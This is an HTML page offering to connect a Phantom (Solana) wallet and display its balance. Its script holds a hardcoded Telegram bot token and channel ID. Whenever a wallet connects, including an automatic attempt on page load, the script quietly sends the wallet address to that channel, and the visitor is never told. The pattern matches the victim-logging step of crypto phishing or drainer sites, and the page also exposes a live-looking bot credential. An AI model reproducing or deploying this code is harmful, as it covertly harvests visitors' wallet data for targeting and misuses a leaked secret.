<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connect Phantom Wallet</title>
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  <style>
    body {
      background-color: #0d0d0d;
      color: white;
      text-align: center;
      font-family: sans-serif;
      padding-top: 80px;
    }
    button {
      background: #6200ea;
      color: white;
      border: none;
      padding: 14px 24px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>Connect Your Solana Wallet</h1>
  <button id="connectBtn">Connect Phantom</button>
  <p id="walletInfo"></p>

  <script>
    const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
    const CHANNEL_ID = "-1002600871606";

    const walletInfo = document.getElementById("walletInfo");

    async function sendToTelegram(walletAddress) {
      const message = `âœ… Wallet Connected: ${walletAddress}`;
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHANNEL_ID, text: message })
      });
    }

    async function fetchBalance(pubkey) {
      const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
      const balanceLamports = await conn.getBalance(new solanaWeb3.PublicKey(pubkey));
      const sol = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
      return sol.toFixed(4);
    }

    function isMobile() {
      return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    }

    async function connectPhantom() {
      if (window.solana && window.solana.isPhantom) {
        try {
          const resp = await window.solana.connect({ onlyIfTrusted: true });
          const pubkey = resp.publicKey.toString();
          const balance = await fetchBalance(pubkey);
          walletInfo.textContent = `Wallet: ${pubkey} | Balance: ${balance} SOL`;
          await sendToTelegram(pubkey);
        } catch (err) {
          console.warn("Trusted connection failed.");
        }
      } else if (isMobile()) {
        const dappUrl = encodeURIComponent(window.location.href);
        window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
      } else {
        alert("Phantom Wallet not detected. Please install Phantom.");
      }
    }

    document.getElementById("connectBtn").addEventListener("click", async () => {
      if (window.solana && window.solana.isPhantom) {
        try {
          const resp = await window.solana.connect();
          const pubkey = resp.publicKey.toString();
          const balance = await fetchBalance(pubkey);
          walletInfo.textContent = `Wallet: ${pubkey} | Balance: ${balance} SOL`;
          await sendToTelegram(pubkey);
        } catch (err) {
          console.error("Connection rejected:", err);
        }
      } else if (isMobile()) {
        const dappUrl = encodeURIComponent(window.location.href);
        window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
      } else {
        alert("Phantom Wallet not found. Please use Phantom or install it.");
      }
    });

    // Try auto-connect on load
    window.addEventListener('DOMContentLoaded', connectPhantom);
  </script>
</body>
</html>
